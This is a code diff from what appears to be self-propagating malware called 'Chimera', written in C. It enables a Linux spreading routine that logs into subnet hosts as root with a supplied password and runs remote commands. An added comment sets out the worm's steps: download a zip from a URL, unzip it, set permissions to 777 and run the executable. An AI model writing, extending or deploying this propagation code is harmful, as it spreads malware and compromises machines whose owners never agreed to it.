@@ -24,7 +24,9 @@ void* spread_worker(void* data) {
         char* username = NULL;
         if (host_os == LINUX) {
             username = "root";
-            // spread_linux(host_ip, username, password);
+             printf("%s\n", username);
+            printf("%s\n", host_ip);
+            spread_linux(host_ip, username, password);
         } else if (host_os == WINDOWS) {
             username = "Administrator";
             // spread_windows(host_ip, username, password);
@@ -32,7 +34,7 @@ void* spread_worker(void* data) {
             username = "cisco";
             // spread_cisco(host_ip, username, password);
         }
-        printf("%s\n", username);
+       
 
     }
     free(data);
@@ -124,6 +126,22 @@ char* remote_execution(const char* host, const char* username, const char* passw
     return output_buffer;
 }
 
+/**
+ * Spreads chimera on linux
+ * 
+ * @param host The hostname or IP address of the remote host.
+ * @param username The username to use for the connection. (OPTIONAL)
+ * @param password The password to use for the connection.
+ * 
+ * The workflow for spreading Chimera on linux is as follows:
+ * 1. Check if the "Chimera" directory exists on the remote Linux machine
+ * 2. If the "Chimera" directory does not exist, download the zip file from the URL
+ * 3. Unzip the zip file
+ * 4. Change the permissions of the "Chimera" directory to 777
+ * 5. Change the permissions of the "Chimera" executable to 777
+ * 6. Run the "Chimera" executable
+ *  
+ */
 void spread_linux(const char* host, const char* username, const char* password) {
     // Check if the "Chimera" directory exists on the remote Linux machine
     const char* check_chimera_dir_cmd = "if [ ! -d \"Chimera\" ]; then echo \"NOT_EXIST\"; fi";
@@ -162,7 +180,7 @@ void spread_linux(const char* host, const char* username, const char* password) 
         }
 
         // Run the command on the remote Linux machine
-        ret = snprintf(command_string, sizeof(command_string), "cd Chimera && ./chimera");
+        ret = snprintf(command_string, sizeof(command_string), "cd Chimera");
         if (ret >= sizeof(command_string)) {
             fprintf(stderr, "Command string too long\n");
             return;
@@ -229,6 +247,11 @@ void spread(const char* subnet, const char* password) {
 }
 
 
+/**
+ * Enumerates the operating system of the remote host.
+ *
+ * @param ip_address The IP address of the remote host.
+ */
 enum os_type get_os_type(const char *ip_address) {
     char command[MAX_BUF_SIZE];
     #if defined(_WIN32) || defined(_WIN64)
